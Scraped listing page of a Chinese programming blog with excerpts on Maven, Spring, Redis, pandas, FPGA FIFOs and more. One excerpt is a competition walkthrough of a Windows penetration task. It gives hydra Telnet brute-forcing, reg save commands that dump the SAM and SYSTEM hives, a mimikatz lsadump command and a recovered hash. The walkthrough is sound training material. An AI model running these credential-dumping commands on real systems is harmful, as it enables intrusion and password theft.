		<a class="list__footer-readmore btn" href="/posts/09d059dcc197e045d99eee704047d009/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32030a409e3eb2f0565b8ea4146d68be/" rel="bookmark">
			maven中的Exclusions标签详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解释 exclusion 标签
1 这个标签的作用是排除关联依赖的引入，因为maven的pom依赖其中 有一点是将关联的依赖全都引入进来 2 这个标签在这的作用就是 如果关联的依赖和引入的其他依赖可能存在冲突， 就必须将关联的依赖排除掉，所以就用这个标签。 3 另外这个＋s的，大家应该也明白 ，就是可以包含多个吗！！！！ 依赖关系：Project-A&gt;Project-B&gt;Project-C，但是Project-A不依赖Project-C，在Project-A中的POM.xml应该进行如下配置：
&lt;dependency&gt; &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt; &lt;artifactId&gt;Project-B&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;!--排除C依赖 declare the exclusion here --&gt; &lt;groupId&gt;sample.ProjectC&lt;/groupId&gt; &lt;artifactId&gt;Project-C&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; A依赖B，B依赖C，在maven当中如果A依赖B，那么A当中就间接的依赖的C，如果要求A不需要依赖C，这个时候该标签的作用就使用到了。
原文链接 link.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e882a317a5941f2efec5a021bb88ad6e/" rel="bookmark">
			阿列夫数算法题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有关阿列夫数的讲解可以看看知乎：地址：https://zhuanlan.zhihu.com/p/367528351 题目描述 冯•诺依曼不单是一位计算机科学家，也是很有名的数学家，他用集合来 定义自然数系统，定义如下： 0 = {} = {} 1 = {0} = {{}} 2 = {0, 1} = {{}, {{}}} 3 = {0, 1, 2} = {{}, {{}}, {{}, {{}}}} …… 请根据上述定义，写出递归函数，由用户输入一个自然数N，输出该自 然数对应的集合表示。例如，如输入为2，则输出为{{}, {{}}}。 测试说明 测试输入： 2 预期输出： {{}, {{}}} Python代码 number = int(input()) # 定义一个列表，用来存放每一个的值 set_list=['{}'] # 这里可以不要if...else if number==0: print('{}',end='') exit(0) else: k=1 for i in range(number): strs='{' for s in set_list: if(len(set_list)&lt;2): strs+=(s) else: #判断是否是它的前一个 if set_list[-1]==s: strs += (s) break # 结束本次循环，因为已经把列表遍历完了 strs += (s+', ') strs+='}' set_list.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e882a317a5941f2efec5a021bb88ad6e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a17e69b210225fbdfb405d9f94359ab6/" rel="bookmark">
			spring.profiles.active=@profiles.active@的含义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		yml配置文件是我们在真实工作中经常会使用的配置文件的格式，有时候我们会遇到些我们没有遇到过的新的表现形式。下面我将会谈谈我在工作中遇到的一个日志配置文件比较有意思的表现形式：
spring.profiles.active=@profiles.active@的含义 spring.profiles.active=@profiles.active@ ，其实是配合 maven profile进行选择不同配置文件进行启动。
当执行mvn clean package -P test命令时， @profiles.active@ 会替换成 test
打开 jar包，即可看到：
案例
构建一个springboot 项目
这里使用idea进行构建的，这个过程省略
pom文件配置
&lt;profiles&gt; &lt;profile&gt; &lt;!-- 生产环境 --&gt; &lt;id&gt;prod&lt;/id&gt; &lt;properties&gt; &lt;profiles.active&gt;prod&lt;/profiles.active&gt; &lt;/properties&gt; &lt;/profile&gt; &lt;profile&gt; &lt;!-- 本地开发环境 --&gt; &lt;id&gt;dev&lt;/id&gt; &lt;properties&gt; &lt;profiles.active&gt;dev&lt;/profiles.active&gt; &lt;/properties&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;/activation&gt; &lt;/profile&gt; &lt;profile&gt; &lt;!-- 测试环境 --&gt; &lt;id&gt;test&lt;/id&gt; &lt;properties&gt; &lt;profiles.active&gt;test&lt;/profiles.active&gt; &lt;/properties&gt; &lt;/profile&gt; &lt;/profiles&gt; 默认dev配置
配置多个配置文件
application.properties
注意这里的profiles.active 要和pom文件的对应上 spring.profiles.active=@profiles.active@ application-dev.properties
name = "dev" application-prod.properties
name = "prod" application-test.properties
name = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a17e69b210225fbdfb405d9f94359ab6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/266a0d4a6e1452cad7e204f022731e89/" rel="bookmark">
			MyBatis分页问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PageMethod.startPage(pageNum,PageSize); List&lt;A&gt; AList = AMapper.selectByExample(exampleA); List&lt;B&gt; BList = BMapper.selectByExample(exampleB); new PageInfo&lt;&gt;(AList); new PageInfo&lt;&gt;(BList); 分页只对AList生效 BList分页失败
原因是PageMethod.startPage(pageNum,PageSize)只对最近一个sql查询有效
解决办法 写多个 PageMethod.startPage(pageNum,PageSize);
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0cd05ab66f16415beb2728f7ba18b0d/" rel="bookmark">
			FT61F023-RB辉芒微微控制器(MCU)单片机方案开发编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FT61F023-RB辉芒微微控制器(MCU)单片机方案开发编程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/95aebab3e76e69fe62f981adfb75cb28/" rel="bookmark">
			elementUI树状多选表格
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		树状多选表格 需回显已选择的 可控制展开收起
&lt;el-button v-if="!fold" @click="foldShow"&gt; &lt;i color="pink" class="el-icon-circle-plus"&gt;&lt;/i&gt;全部展开 &lt;/el-button&gt; &lt;el-button v-if="fold" @click="foldNone"&gt; &lt;i color="pink" class="el-icon-remove"&gt;&lt;/i&gt;全部收起 &lt;/el-button&gt; &lt;el-table v-loading="loading" :data="deptList" row-key="id" default-expand-all :tree-props="{children: 'children', hasChildren: 'hasChildren'}" ref="checkTable" @select="select" @select-all="selectAll" @selection-change="selChange"&gt; &lt;el-table-column type="selection" width="55"&gt;&lt;/el-table-column&gt; &lt;el-table-column prop="roadName" label="路线编号" &gt;&lt;/el-table-column&gt; &lt;el-table-column prop="name" label="路线编号及所属公司"&gt;&lt;/el-table-column&gt; &lt;/el-table&gt; fold:true,
// 遮罩层
ZDSJloading:true,
// 表格树数据
deptList: [],
forArr(arr, isExpand) { arr.forEach(i =&gt; { this.$refs.checkTable.toggleRowExpansion(i, isExpand) if (i.children) { this.forArr(i.children, isExpand) } }) }, foldShow(){ this.fold=!this.fold this.forArr(this.deptList, true) }, foldNone(){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/95aebab3e76e69fe62f981adfb75cb28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/553cf6bd81fe5cc5ec5fa24dcce50dcd/" rel="bookmark">
			Java使用Cipher类实现加密，包括DES，DES3，AES和RSA加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先看一个简单加密，解密实现 加密 /** * content: 加密内容 * slatKey: 加密的盐，16位字符串 * vectorKey: 加密的向量，16位字符串 */ public String encrypt(String content, String slatKey, String vectorKey) throws Exception { Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); SecretKey secretKey = new SecretKeySpec(slatKey.getBytes(), "AES"); IvParameterSpec iv = new IvParameterSpec(vectorKey.getBytes()); cipher.init(Cipher.ENCRYPT_MODE, secretKey, iv); byte[] encrypted = cipher.doFinal(content.getBytes()); return Base64.encodeBase64String(encrypted); } 解密 /** * content: 解密内容(base64编码格式) * slatKey: 加密时使用的盐，16位字符串 * vectorKey: 加密时使用的向量，16位字符串 */ public String decrypt(String base64Content, String slatKey, String vectorKey) throws Exception { Cipher cipher = Cipher.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/553cf6bd81fe5cc5ec5fa24dcce50dcd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cddf8009386cd93bc8a9366c18874b14/" rel="bookmark">
			No matching version found for xxx 和package version that doesn‘t exist的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在拉新项目npm install时报错，之前也遇到过，是npm版本的问题，升级或者降低到对应npm版本即可。
可是今天我是用nvm切换了好几个node和npm版本，还是不行。记录一下这个坑。
原因：package-lock.json文件没有锁定，也就是新项目拉下来是没有这个文件的，并且在package.json文件里的依赖版本使用“^”符号，如sass：^6.10.1，这是想上兼容的写法，并没有指定具体的小版本。package-lock.json才会锁定。
解决：单独npm install报错的这个包，！！但是不要指定版本，package-lock.json它会在npm更改node_modules目录树或者package.json时自动生成的（注意这是npm5版本后才会自动生成），这时候就有了package-lock.json文件。再一次npm i 即可。然后再把 package.json之前指定版本改回去。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00a691ed303d749e2cf10217607e62d2/" rel="bookmark">
			PYTHON -MYSQLDB安装遇到的问题和解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 PYTHON -MYSQLDB安装遇到的问题和解决办法
参考文章：
（1）PYTHON -MYSQLDB安装遇到的问题和解决办法
（2）https://www.cnblogs.com/gaoshanxiaolu/p/3918374.html
备忘一下。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f41b05117c29d0e468c69441f36a95d3/" rel="bookmark">
			C语言：学生成绩管理系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一：功能概述：
二：实现：
1.主源文件
1.打印菜单！
2.构建管理系统的框架：
二：辅源文件 1.使用结构体，方便后面的编写
2.输入学生信息
3.输出学生基本信息
3.按姓名查询
3.删除学生信息
4.修改学生信息
5.添加学生
6.按成绩打印学生排名
三：心得体会
一：功能概述： 实现：
1.学生学习成绩录入 2.学生学习成绩输出 3.删除某学生信息
4.按姓名查询某学生信息并输出
5.修改某学生信息
6.添加某学生信息
7.按总成绩排名 等等功能！
二：实现： 为了方便修改，同时增加代码的可读性，实现每一个功能的时候都应该用一个具体的函数。
同时，创建两个源文件，一个实现教务系统的逻辑为主源文件，一个完善实现逻辑时的所需要的函数块，为辅源文件。
1.主源文件 1.打印菜单！ 9.void menu() 10.{ 11. printf(" 欢迎使用Miao编写的教务管理系统 \n"); 12. Sleep(50); 13. printf("请按任意将进入学生管理系统:\n"); 14. getchar(); 15. printf("=============================================================\n"); Sleep(50); 16. printf("=============================================================\n"); Sleep(50); 17. printf("|| 1.学生学习成绩录入 ||\n"); Sleep(50); 18. printf("|| 2.学生学习成绩输出 ||\n"); Sleep(50); 19. printf("|| 3.删除某学生信息 ||\n"); Sleep(50); 20. printf("|| 4.按姓名查询某学生信息并输出 ||\n"); Sleep(50); 21.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f41b05117c29d0e468c69441f36a95d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/965785d195caa4fdd55c40028d1dbdae/" rel="bookmark">
			解决python toad包报错joblib.externals.loky.process_executor.TerminatedWorkerError
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当运行官方的toad.quality()时，无法得到结果，并抛出报错
解决方法 首先检查toad版本：我的是toad == 0.0.64，python3.6版本只需更换python版本为3.8，然后重新安装toad即可：pip install toad 问题解析 toad=0.1.0时不会出问题，但是python3.6无法更新到0.1.0，python3.8可以(python3.7未尝试)
toad github地址：https://github.com/amphibian-dev/toad
toad 文档：https://toad.readthedocs.io/en/stable/tutorial.html
toad pypi地址：https://pypi.org/project/toad/
完整报错 Traceback (most recent call last): File "/Applications/PyCharm.app/Contents/plugins/python/helpers/pydev/_pydevd_bundle/pydevd_comm.py", line 292, in _on_run r = self.sock.recv(1024) OSError: [Errno 9] Bad file descriptor Traceback (most recent call last): File "/Applications/PyCharm.app/Contents/plugins/python/helpers/pydev/_pydevd_bundle/pydevd_comm.py", line 292, in _on_run r = self.sock.recv(1024) Traceback (most recent call last): OSError: [Errno 9] Bad file descriptor File "/Applications/PyCharm.app/Contents/plugins/python/helpers/pydev/_pydevd_bundle/pydevd_comm.py", line 292, in _on_run r = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/965785d195caa4fdd55c40028d1dbdae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5c47d03c6a1bc21d32ff888902f297f/" rel="bookmark">
			DS18B20测温与数码管显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原本要写一篇DS18B20测温LCD1602显示的实验，应关注者的要求先写了一篇DS18B20测温与数码管显示的实验。DS18B20测温与数码管显示是通过51单片机读取DS18B20的温度值，然后实时的通过数码管显示当前温度值。
1.系统原理图(回复关键字DS18B20,自动获取原理图代码下载连接)
数码管采用的共阳极数码管，数据口段码接单片机的P0口，位选信号接的单片机的P2.0、P2.1、P2.2、P2.3。其中P2.0控制百位显示，P2.1控制十位显示，P2.2控制各位及小数点显示，P2.3为小数位显示控制端。共阳数码管与单片相连时单片机的灌电流极小，不能用来驱动数码管，需要接三极管放大电流来点亮数码管，三极管采用NPN型的接法如图所示。
2.系统主程序
void main()
{
float tmp=0.0;
int count = 0; unsigned int temp=0;
P2=0X00;
dsInit();
while(1)
{
if(count &gt;= 100)
{
sendChangeCmd();
tmp=getTmpValue();
temp=(unsigned int)(tmp*10.0);
count = 0;
}
LEDdisplay(temp);
count++;
}
} 3.数码管显示代码
/*******************************************************************************
* 函 数 名 ：LEDdisplay
* 函数功能 ：循环显示各个位上的数据
* 输 入 ：num要显示的数据
* 输 出 ：无
*******************************************************************************/
void LEDdisplay(unsigned int num)
{
unsigned char qian,bai,shi,ge;
qian=num/1000;
bai=num%1000/100;
shi=num%100/10;
ge=num%10;
wela_1 = 0; //关闭所有数码管
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5c47d03c6a1bc21d32ff888902f297f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0426629d92388124380765b56e6b4be3/" rel="bookmark">
			Redis学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis官网
菜鸟教程—redis
Redis(Remote Dictionary Server)：远程字典服务，c语言编写，nosql数据库，存储KV，基于内存
文章目录 1、启动服务2、进入命令行3、退出4、测试5、切换数据库6、清空数据库7、查看当前数据库的所有key8、设置key的过期时间9、查看当前key的剩余时间10、移除key11、查看当前key的类型12、查看key是否存在13、移动当前数据库的key到另一个数据库 String1、追加字符2、计算字符串长度3、自增14、自减15、自增value6、自减value7、截取字符串（substr）8、替换字符串（replace）9、设置过期时间10、批量set11、get之前的value并且set新value List1、插入到list2、从list移除3、查看区间的value4、从下标获取value5、获取list长度6、移除指定的value7、截取8、从一个list移除到另一个list9、指定下标修改value10、在某个value的前/后插入新value Set1、添加2、查看set的内容3、判断set中是不是有某个值4、获取set中的个数5、移除某个值6、随机获得若干个set中的值7、随机删除一个值8、将一个set中的值移动到另一个set9、差集10、交集11、并集 Hash1、添加2、获取3、添加多个4、获取多个5、获取所有数据6、删除指定的key7、获取key—value对数8、判断是否存在9、获取所有的key10、获取所有的value 1、启动服务 redis-server [redis.conf路径] [默认port：6379]
2、进入命令行 redis-cli 3、退出 进入redis客户端命令行后 shutdown -- 退出服务 exit -- 断开连接 4、测试 redis-benchmark -p [端口号] -h localhost -c [并发数] -n [请求数] 5、切换数据库 select [id] [默认为第0个数据库]
6、清空数据库 flushdb --清空当前数据库 flushall --清空所有数据库 7、查看当前数据库的所有key keys * 8、设置key的过期时间 expire [key] [ttl] --单位是秒 9、查看当前key的剩余时间 ttl [key] 10、移除key del [key] 11、查看当前key的类型 type [key] 12、查看key是否存在 exists [key] 13、移动当前数据库的key到另一个数据库 move [key] [index] String 1、追加字符 append [key] [string] 2、计算字符串长度 strlen [key] 3、自增1 incr [key] 4、自减1 decr [key] 5、自增value incrby [key] [value] 6、自减value decrby [key] [value] 7、截取字符串（substr） getrange [key] [start] [end] [end = -1时，效果和get [key] 一致]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0426629d92388124380765b56e6b4be3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/85ec9ec08aef54c073d271f8363458d9/" rel="bookmark">
			注释的用途及注意事项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 作用：注释就是程序员为读者做的说明，是提高程序可读性的一种手段。
第一种： // （单行注释）像字面上的意思一样，注释内容从 // 到本行结尾。
如：
/* */ （多行注释）也是和字面意思一样，可以进行多行注释如：
注意 ：
注释不能嵌套，也不会出现在字节码文件中
java编译器编译的时候会跳过注释语句 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b89240248bbb1ead0a08d5b9a99dd17/" rel="bookmark">
			2021年山东省中职组网络安全省赛B模块windows渗透解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		B-10任务十：Windows操作系统渗透测试任务环境说明：●服务器场景：Server2（封闭链接）●服务器场景操作系统：Windows7
1.通过本地PC中渗透测试平台Kali对服务器场景进行系统服务及版本扫描渗透测试，并将该操作显示结果中Telnet服务对应的端口号作为FLAG提交；
首先第一道题目就非常简单，直接使用nmap -sV 版本扫描进行得出flag:
Flag:23
2.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为Administrator），将hydra使用的必要参数当做FLAG进行提交（例：nmap-s-p22）；（字典路径/usr/share/wordlists/dirb/small.txt）
这一道题目那就使用hydra指定字典进行爆破：
Flag: hydra -l Administrator -P /usr/share/wordlists/dirb/small.txt 192.168.70.136 telnet
3.通过本地PC中渗透测试平台Kali对服务器场景进行渗透测试，使用kali中hydra对服务器Telnet服务进行暴力破解（用户名为Administrator），将破解成功的密码当做FLAG进行提交；（字典路径/usr/share/wordlists/dirb/small.txt）
根据上面的题目：
Flag:123
4.通过本地PC中渗透测试平台win7对服务器场景进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中sam文件使用reg相关命令提取，将完整命令作为FLAG提交；
成功导出：
Flag:reg save HKLM\SAM sam.hive
5.通过本地PC中渗透测试平台win7对服务器场景进行渗透测试，取得的账户密码有远程桌面权限，将该场景系统中system文件使用reg相关命令提取，将完整命令作为FLAG提交；
根据上一道题目：
Flag:reg save HKLM\SYSTEM system.hiv
6.通过本地PC中渗透测试平台win7对服务器场景进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取Administrator密码信息，将提取信息的命令作为FLAG提交;
Flag: lsadump::sam /sam:C:\sam.hive /system:C:\system.hiv
7.通过本地PC中渗透测试平台win7对服务器场景进行渗透测试，将sam文件与system文件提取到本地，使用桌面mimikatz工具提取administrators密码信息，将提取到的hash值作为FLAG提交
上一道题目得出：
Flag: 3dbde697d71690a769204beb12283678
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d79befef349cc1a6381d6e0dbe6371d9/" rel="bookmark">
			linux 通过打补丁的方式更新文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原理： 使用 diff 命令把修改前和修改后两个文件的差异记录在 patch 文件中，然后用 patch 命令把 patch 文件打到旧文件中得到新文件。
可以用于更新终端设备的文件，或者同步文件的修改内容给其他用户。
制作补丁 制作文件的补丁：
$ diff -au old.file new.file &gt; test.patch old.file 修改前的文件，new.file 修改后的文件。
test.patch 补丁文件，记录了 old.file 文件和 new.file 文件的差异。
制作目录的补丁
$ diff -Naur old/ new/ &gt; test1.patch old 修改前的目录，new 修改后的目录。
命令选项说明：
-N 不存在的文件以空文件方式处理 -a 所有文件都以文本方式处理 -u [n] 输出（默认为 3 行）一致的上下文（差异前后相同的行，方便定义差异的位置） -r 连同所有子目录一起比较（递归处理） 更多的选项可以通过命令 diff --help 查询。
打补丁 更新文件：
把 test.patch 文件拷贝到 old.file 文件同级目录，执行命令：
$ patch -p0 &lt; test.patch 执行完命令后就可以把 old.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d79befef349cc1a6381d6e0dbe6371d9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd6557d93caff0038d49adb0012a1499/" rel="bookmark">
			Visual Studio 2019输出乱码原因总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一.乱码的原因二.编码查看方法控制台编码查看方法 解决方法1. 修改控制台编码（推荐）2.修改文件编码 今天做老师布置的作业时，我的VS2019突然出现了乱码。 于是在查了很多资料之后，整理了一下 一.乱码的原因 中文在不同编码格式下, 存储的方式不一样.如果程序是A编码方式编译运行的,但是控制台却是以B编码方式来显示, 就会出现乱码.vs的控制台默认编码是GB2312,编号是836 注意:
GBK编码是兼容GB2312的,一般描述GBK常常就是指BG2312. 如果源代码文件的编码是其他编码格式, 就会导致中文乱码.
正常情况下:
在vs中新建文件时,该文件默认都是GB2312编码.
因为控制台默认也是GB2312编码,所以一般情况下,都不会出现中文乱码.
二.编码查看方法 控制台编码查看方法 vs直接运行然后如图：在顶部区域右键并点击属性
可以看到我的当前代码页为65001，即UTF-8编码，和vs2019默认的控制台编码不同，引发的乱码
解决方法 1. 修改控制台编码（推荐） WIN+R打开，输入regedit，并点击确定
找到“计算机\HKEY_CURRENT_USER\Console\”文件夹下的与Visual Studio相关的文件夹，把Codepage项的值（65001）改成936就可以了。
可以看到问题解决了。
2.修改文件编码 我没用这个解决问题，但是也写一下怎么修改吧
VS 2019隐藏了高级保存功能，导致没办法直接去设置代码编码
但我们可以通过设置，调出这个命令。
点开工具选项卡中的自定义
将菜单栏修改成文件，如图（这里是选择我们添加命令的位置）
点击添加命令
找出如图选项，点击确定
就可以找到这个命令了
点击此命令
确定，ok。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92a30e4e4ce46013805ac3c3eabe58e1/" rel="bookmark">
			Vivado-FIFO Generator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://blog.csdn.net/lzy13785490347/article/details/113404657
FIFO Generator IP核的使用 1 概述 （1）最大支持500M
（2）支持三种接口：Native interface FIFOs、 AXI Memory Mapped interface FIFOs、 AXI4-Stream interface FIFOs
（3）读写数据时，在数据上升沿采样
2 FIFO规则 2.1 empty/full信号
实际上即使有数据写入到fifo中，empty还是为高，等一些周期之后才会拉低，具体多少个周期之后不一定，不知道。就理解成fifo的反应有点慢就行了。
如图：
不管fifo的empty信号什么时候拉低，咱们不用管，咱们使用者只要知道，当empty信号拉低以后，就可以将读请求rd_en拉高读取数据，当empty拉高后，就不能使能rd_en了。
同样，对于full信号，只有当full为低的时候，才能使wr_en置1。
如图所示，当full置1了，写使能信号wreq拉低了，记住是上升沿采样，所以5这个值没有写进去.
注意：
（1）对于full信号，当full为1后，绝对不能再写入数据。
（2）empty为1后，绝对不要进行读数据
（3）无任何说明，绝对不能丢失数据，也不能多读数据
（4）当异步的时候，full信号是和写时钟域同步的，empty信号时和读时钟域同步的，这一点要记得，再写verilog代码时候需要考虑进来。还有rd_data_count和wr_data_count也是不同时钟域的，需要注意。
2.2 almost_full /almost_empty
almost_empty：表明fifo中的数据几乎要空了，只有一笔数据可以进行读取了。
almost_full：表明fifo中的数据几乎要满了，最多能再写一笔数据进去了。
2.3 rd_data_count/wr_data_count
这个就很坑了！
一直以为rd_data_count指的是从fifo中读出了几个数据，wr_data_count指的是向fifo中写入了几个数据，，，，，其实完全不是那样的。两个值都指的是fifo中存了多少数据，而在异步fifo时候，两个信号的时钟域不同，所以波形中两者不是同时出现的。
也就是说rd_data_count和wr_data_count指的是同一个东西。
基于这一点，本人做了一个实验：
如图，一直往FIFO中写数据，可以看到wr_data_count一直在计数。但是rd_en一直为0，但是rd_data_count却也有数据在变化。这就说明了rd_data_count并不是指的是从fifo中读出来了多少数据。
看PG057解释：
也是上面所说fifo中有多少数据，而不是写入或者读出了多少数据。
注意：
（1）rd_data_count和wr_data_count也只是个大概值，并不完全准确。rd_data_count小于等于实际上fifo中的数，以免没数据的时候进行数据读取，相反，wr_data_count大于等于实际上fifo中数，以免溢出。
（2）写入写接口的数据要经过一些周期才能在读接口中被读出。
（3）还有一点需要重点强调的就是，rd_data_count/wr_data_count的值不是fifo中数据多少个字节，而是多少笔。
怎么理解呢？
举例来说，我设置写入的位宽为32bit，那么写入fifo一笔就是4个字节，但wr_data_count是1而不是4。如图所示，位宽为32bit，写了64个字节，需要16笔，wr_data_count计数为16.
2.4 读写隔离
FIFO的读写隔离是实践总结出来的经验，在官方文档中并没有提及。使用fifo时候最好能够符合读写隔离。
什么是读写隔离呢？
读写隔离指的是，读写控制信号间是独立的，他们之间除了用fifo交流信息外，不能有任何信息交流。意思就是说，读FIFO的状态不能根据写fifo的信号来决定，写fifo也不能根据读fifo中的数据或状态来决定。
例：写侧的din_data写入FIFO时，其中包文包括了200个字节，使用din_vld作为读写使能，有可能出现读写不同步，因为你存入时就是你读出时；也有可能来了个短包文，存储完立马来了长包文，那么此时到底是写还是读？长包文未读完，来了短包文，此时FIFO就不知道如何处理。读写两侧应使用独立信号而不是互连信号。
2.5 读使能用组合逻辑
读使能必须判断空状态，并且要用组合逻辑产生。
这里指的是First-Word Fall-Fhrough模式，其实还是时序问题，不然可以导致多读一个，具体波形出来了以后具体分析吧。
2.6 因果关系
因果关系和上面的读写隔离其实是差不多的意思。
例如当判断rd_data_count达到某个值以后，令写使能wr_en置位继续往fifo中写数据，写入的数据又会导致rd_data_count的值变化，这要就造成了死循环。
真正的因果关系是，empty导致wr_en进行写数据，所以rd_data_count增加。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92a30e4e4ce46013805ac3c3eabe58e1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b3de4615803067aea5dc93800ae6f5e/" rel="bookmark">
			python基础-pandas生成时间序列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 python基础-pandas生成时间序列 pandas中的date_range()函数用来生成一个日期序列，在需要构造一个日期序列的时候非常方便。
代码 import pandas as pd import numpy as np import datetime as dt #创建2016年7越1号开始，以天为单位，十天的时间序列,指定频率(D\M\H),及倍数,或写起止日 rng = pd.date_range('2016/07/01',periods=10,freq ='3D') print(rng) rng = pd.date_range('2016/07/01',periods=10,freq ='M') print(rng) #做索引，根据时间做索引 time = pd.Series(np.random.randn(20), index=pd.date_range(dt.datetime (2016,1,1),periods=20)) print(time) print(time['2016-01-01':'2016-01-04']) #时间过滤 time.truncate(before='2016-1-10') time.truncate(after='2016-1-10') #时间戳 pd.Timestamp('2016-07-01 00:00:00') #时间区间 print(pd.Period('2016-01')) print(pd.Period('2016','M')) print(pd.Period('2016-01','D')) #时间加减 print(pd.Timedelta('1 day')) print(pd.Period('2016-01-01 10:10')+pd.Timedelta('1 day')) p1=pd.period_range('2016-01-01 10:10',freq ='1D1H',periods=10) print(p1) print(pd.Period('2016-01-01 10:10')+pd.Timedelta('1 day')) 总结 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79056582f6e669840f64e0c5e782f801/" rel="bookmark">
			Educoder - Java继承和多态之对象类型的转换（1,2）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		过关全靠idea
掌握知识点 类的对象类型转换类的继承和多态向上转型向下转型instanceof 方法 通关源码（1） /** * Create By 刘鸿涛 * 2021/12/13 18:01 */ class Animal{ // 定义动物类的属性 public String name = "动物"; public static String staticName = "可爱的动物"; // 定义动物类的行为方法 public void eat() { System.out.println("动物吃饭"); } public static void staticEat() { System.out.println("可爱的动物正在在吃饭"); } } // 定义猫类，该类继承动物类 public class Cat extends Animal{ // 定义猫类的属性 public String name = "猫"; public String str = "可爱的小猫"; public static String staticName = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/79056582f6e669840f64e0c5e782f801/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a87242282f63b630555e9753ada58cf/" rel="bookmark">
			linux 高效搜索命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		grep -r "变量名" ./* &gt;&gt;log.txt //在当前目录下查找所有文件中的变量名，并打印输出
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
